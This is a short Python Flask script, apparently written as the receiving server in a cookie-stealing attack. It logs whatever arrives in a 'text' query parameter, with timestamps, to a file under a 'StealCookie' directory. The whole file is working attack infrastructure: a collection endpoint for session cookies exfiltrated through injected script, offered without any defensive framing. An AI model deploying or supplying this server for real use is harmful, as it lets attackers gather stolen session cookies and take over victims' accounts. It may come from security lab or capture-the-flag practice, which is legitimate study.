from flask import Flask, request
import time

app = Flask(__name__)

text_file_path = "./StealCookie/data.txt"

@app.route('/', methods=['GET', 'POST'])
def store_data():
    # Get the data from the POST request
    data = request.args.get('text')

    print(data, time.time())
    
    # Append the data to the text file
    with open(text_file_path, 'a') as f:
        f.write(data + "\n")
    
    return ""

if __name__ == '__main__':
    app.run(debug=True, port=34000)

    